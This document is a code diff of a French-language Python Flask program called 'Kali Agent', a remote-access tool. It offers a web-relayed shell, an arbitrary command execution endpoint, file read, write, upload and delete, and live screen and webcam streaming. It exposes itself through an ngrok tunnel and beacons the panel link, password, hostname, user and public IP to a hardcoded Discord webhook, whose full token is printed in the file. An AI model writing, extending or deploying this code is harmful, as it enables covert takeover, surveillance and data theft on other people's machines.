@@ -1,15 +1,15 @@
 #!/usr/bin/env python3
 import os, sys, json, base64, io, time, threading, signal, pty, select, struct, fcntl, termios
-import subprocess, requests, tempfile, shutil, mimetypes
+import subprocess, requests, tempfile, shutil, mimetypes, re
 from datetime import datetime
 from flask import Flask, render_template, request, jsonify, send_file, Response, abort
 from flask_socketio import SocketIO, emit
 
 # ===== CONFIG =====
 WEBHOOK_URL = "https://discord.com/api/webhooks/1516834045026369709/523I42gDEz_0P1WKwi2-q8oNCUNLzulgF2AS749llpNJGsCNvaB9x59fdq8xalKgZGkN"
-NGROK_AUTH_TOKEN = ""  # Optionnel mais recommandé
+NGROK_AUTH_TOKEN = ""
 PORT = 5000
-PASSWORD = "kali"  # Mot de passe pour accéder au panel
+PASSWORD = "kali"
 
 app = Flask(__name__, template_folder="templates")
 app.config["SECRET_KEY"] = os.urandom(16).hex()
@@ -22,7 +22,12 @@ current_dir = os.path.expanduser("~")
 camera = None
 ngrok_url = None
 
-# ===== SHELL (PTY) =====
+# ===== ANSI STRIP =====
+ansi_re = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
+def strip_ansi(text):
+    return ansi_re.sub('', text)
+
+# ===== SHELL =====
 def start_shell():
     global shell_fd, shell_pid
     pid, fd = pty.fork()
@@ -35,6 +40,7 @@ def start_shell():
         threading.Thread(target=shell_reader, daemon=True).start()
 
 def shell_reader():
+    buf = ""
     while True:
         try:
             r, _, _ = select.select([shell_fd], [], [], 0.1)
@@ -42,7 +48,12 @@ def shell_reader():
                 data = os.read(shell_fd, 4096)
                 if not data:
                     break
-                socketio.emit("shell:data", {"data": data.decode("utf-8", errors="replace")})
+                decoded = data.decode("utf-8", errors="replace")
+                buf += decoded
+                if "\n" in decoded or len(buf) > 200:
+                    clean = strip_ansi(buf)
+                    socketio.emit("shell:data", {"data": clean})
+                    buf = ""
         except:
             break
 
@@ -50,18 +61,27 @@ def set_window_size(fd, rows, cols):
     winsize = struct.pack("HHHH", rows, cols, 0, 0)
     fcntl.ioctl(fd, termios.TIOCSWINSZ, winsize)
 
-# ===== SCREEN CAPTURE =====
+# ===== SCREEN CAPTURE (with cursor) =====
 def capture_screen():
+    try:
+        result = subprocess.run(
+            ["import", "-window", "root", "-quality", "70", "png:-"],
+            capture_output=True, timeout=5
+        )
+        if result.stdout:
+            return base64.b64encode(result.stdout).decode()
+    except:
+        pass
     try:
         import mss
         with mss.mss() as sct:
             monitor = sct.monitors[1]
             img = sct.grab(monitor)
-            buffer = io.BytesIO()
             from PIL import Image
+            buffer = io.BytesIO()
             Image.frombytes("RGB", img.size, img.rgb).save(buffer, "JPEG", quality=70)
             return base64.b64encode(buffer.getvalue()).decode()
-    except Exception as e:
+    except:
         return None
 
 def screen_stream():
@@ -70,7 +90,7 @@ def screen_stream():
             img = capture_screen()
             if img:
                 socketio.emit("screen:frame", {"image": img})
-            time.sleep(0.05)
+            time.sleep(0.1)
         except:
             break
 
@@ -95,11 +115,11 @@ def webcam_stream():
             img = get_webcam()
             if img:
                 socketio.emit("webcam:frame", {"image": img})
-            time.sleep(0.05)
+            time.sleep(0.08)
         except:
             break
 
-# ===== FILE OPERATIONS =====
+# ===== FILE OPS =====
 def safe_path(path):
     global current_dir
     if not os.path.isabs(path):
@@ -107,55 +127,17 @@ def safe_path(path):
     path = os.path.realpath(path)
     return path
 
-# ===== NGROK =====
-def start_ngrok():
-    global ngrok_url
-    try:
-        from pyngrok import ngrok as ngrok_client
-        if NGROK_AUTH_TOKEN:
-            ngrok_client.set_auth_token(NGROK_AUTH_TOKEN)
-        tunnel = ngrok_client.connect(PORT, "http")
-        ngrok_url = tunnel.public_url
-        print(f"[+] Ngrok URL: {ngrok_url}")
-        return ngrok_url
-    except:
-        try:
-            result = subprocess.run(
-                ["ngrok", "http", str(PORT), "--log", "stdout"],
-                capture_output=True, text=True, timeout=5
-            )
-        except:
-            pass
-
-        try:
-            r = requests.get("http://127.0.0.1:4040/api/tunnels", timeout=5)
-            data = r.json()
-            ngrok_url = data["tunnels"][0]["public_url"]
-            print(f"[+] Ngrok URL: {ngrok_url}")
-            return ngrok_url
-        except:
-            return None
-
-def send_webhook(url):
-    try:
-        data = {
-            "content": f"🚀 **Kali Agent prêt !**\n🔗 **Panel:** {url}\n🔑 **Password:** `{PASSWORD}`\n🕐 {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}",
-            "username": "Kali Agent",
-            "avatar_url": "https://cdn.discordapp.com/emojis/1005192846461870111.png"
-        }
-        requests.post(WEBHOOK_URL, json=data, timeout=10)
-        print("[+] Webhook envoyé")
-    except Exception as e:
-        print(f"[-] Webhook error: {e}")
-
 # ===== AUTH CHECK =====
 def check_auth(req):
     auth = req.headers.get("Authorization", "")
+    if auth == PASSWORD:
+        return True
+    auth = req.args.get("auth", "")
     return auth == PASSWORD
 
 @app.before_request
 def before_request():
-    if request.endpoint and request.endpoint != "panel" and request.method != "OPTIONS":
+    if request.endpoint and request.endpoint not in ("panel", "static") and request.method != "OPTIONS":
         if not check_auth(request):
             return jsonify({"error": "Unauthorized"}), 401
 
@@ -164,7 +146,7 @@ def before_request():
 def panel():
     auth = request.args.get("auth", "")
     if auth != PASSWORD:
-        return '<html><body><form method="GET"><input type="password" name="auth" placeholder="Password"><input type="submit"></form></body></html>'
+        return '<html><body style="background:#000;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh"><form method="GET"><input type="password" name="auth" placeholder="Password" style="background:#111;color:#0f0;border:1px solid#0f0;padding:10px;font-family:monospace;font-size:16px"><input type="submit" value="ENTRER" style="background:#0f0;color:#000;border:none;padding:10px;font-family:monospace;font-size:16px;cursor:pointer"></form></body></html>'
     return render_template("panel.html", password=PASSWORD)
 
 @app.route("/api/auth", methods=["POST"])
@@ -199,12 +181,15 @@ def api_ls():
     items = []
     for item in os.listdir(real):
         full = os.path.join(real, item)
-        items.append({
-            "name": item,
-            "type": "dir" if os.path.isdir(full) else "file",
-            "size": os.path.getsize(full) if os.path.isfile(full) else 0,
-            "mtime": os.path.getmtime(full)
-        })
+        try:
+            items.append({
+                "name": item,
+                "type": "dir" if os.path.isdir(full) else "file",
+                "size": os.path.getsize(full) if os.path.isfile(full) else 0,
+                "mtime": os.path.getmtime(full)
+            })
+        except:
+            pass
     return jsonify({"path": real, "items": items})
 
 @app.route("/api/download")
@@ -224,6 +209,31 @@ def api_upload():
     file.save(filepath)
     return jsonify({"ok": True, "path": filepath})
 
+@app.route("/api/read", methods=["POST"])
+def api_read():
+    data = request.json
+    path = safe_path(data.get("path", ""))
+    if not os.path.isfile(path):
+        return jsonify({"error": "Not a file"}), 404
+    try:
+        with open(path, "r", encoding="utf-8", errors="replace") as f:
+            content = f.read()
+        return jsonify({"content": content, "path": path})
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+@app.route("/api/write", methods=["POST"])
+def api_write():
+    data = request.json
+    path = safe_path(data.get("path", ""))
+    content = data.get("content", "")
+    try:
+        with open(path, "w", encoding="utf-8") as f:
+            f.write(content)
+        return jsonify({"ok": True})
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
 @app.route("/api/delete", methods=["POST"])
 def api_delete():
     data = request.json
@@ -241,8 +251,15 @@ def api_exec():
     data = request.json
     cmd = data.get("cmd", "")
     try:
-        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
-        return jsonify({"stdout": result.stdout, "stderr": result.stderr, "code": result.returncode})
+        result = subprocess.run(
+            ["bash", "-c", cmd],
+            capture_output=True, text=True, timeout=30
+        )
+        return jsonify({
+            "stdout": strip_ansi(result.stdout),
+            "stderr": strip_ansi(result.stderr),
+            "code": result.returncode
+        })
     except subprocess.TimeoutExpired:
         return jsonify({"error": "Timeout"}), 500
 
@@ -250,17 +267,21 @@ def api_exec():
 def api_info():
     try:
         uname = os.uname()
+        host = os.popen("hostname").read().strip()
+        user = os.getenv("USER", "unknown")
+        ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
         return jsonify({
-            "hostname": uname.nodename,
+            "hostname": host,
             "os": f"{uname.sysname} {uname.release}",
-            "user": os.getenv("USER", "unknown"),
+            "user": user,
             "cwd": current_dir,
-            "uptime": open("/proc/uptime").read().split()[0] if os.path.exists("/proc/uptime") else "N/A"
+            "ip": ip,
+            "uptime": os.popen("uptime -p").read().strip() if os.path.exists("/proc/uptime") else "N/A"
         })
-    except:
-        return jsonify({"hostname": "unknown"})
+    except Exception as e:
+        return jsonify({"hostname": "unknown", "error": str(e)})
 
-# ===== SOCKETIO EVENTS =====
+# ===== SOCKETIO =====
 @socketio.on("shell:input")
 def handle_shell_input(data):
     global shell_fd
@@ -284,6 +305,55 @@ def handle_start_screen():
 def handle_start_webcam():
     threading.Thread(target=webcam_stream, daemon=True).start()
 
+# ===== NGROK =====
+def start_ngrok():
+    global ngrok_url
+    try:
+        from pyngrok import ngrok as ngrok_client
+        if NGROK_AUTH_TOKEN:
+            ngrok_client.set_auth_token(NGROK_AUTH_TOKEN)
+        tunnel = ngrok_client.connect(PORT, "http")
+        ngrok_url = tunnel.public_url
+        print(f"[+] Ngrok URL: {ngrok_url}")
+        return ngrok_url
+    except:
+        pass
+    try:
+        proc = subprocess.Popen(
+            ["ngrok", "http", str(PORT), "--log", "stdout"],
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+        )
+        time.sleep(3)
+        r = requests.get("http://127.0.0.1:4040/api/tunnels", timeout=5)
+        data = r.json()
+        ngrok_url = data["tunnels"][0]["public_url"]
+        print(f"[+] Ngrok URL: {ngrok_url}")
+        return ngrok_url
+    except:
+        return None
+
+def send_webhook(url):
+    try:
+        host = os.popen("hostname").read().strip()
+        user = os.getenv("USER", "unknown")
+        ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
+        embed = {
+            "title": "🚀 Kali Agent Prêt",
+            "color": 5763719,
+            "fields": [
+                {"name": "🔗 Panel", "value": f"{url}?auth={PASSWORD}", "inline": False},
+                {"name": "🖥 Hostname", "value": host, "inline": True},
+                {"name": "👤 User", "value": user, "inline": True},
+                {"name": "🌍 IP", "value": ip, "inline": True},
+                {"name": "🔑 Password", "value": f"`{PASSWORD}`", "inline": True}
+            ],
+            "footer": {"text": datetime.now().strftime("%d/%m/%Y %H:%M:%S")}
+        }
+        requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=10)
+        print("[+] Webhook envoyé")
+    except Exception as e:
+        print(f"[-] Webhook error: {e}")
+
 # ===== MAIN =====
 if __name__ == "__main__":
     print("[+] Démarrage de l'agent Kali...")
@@ -296,6 +366,8 @@ if __name__ == "__main__":
     if url:
         print(f"[+] URL publique: {url}")
         send_webhook(url)
+        print(f"[+] Mot de passe: {PASSWORD}")
+        print(f"[+] Lien direct: {url}?auth={PASSWORD}")
     else:
         print("[-] Ngrok non disponible, en local uniquement")
         print(f"[+] Accès local: http://127.0.0.1:{PORT}")
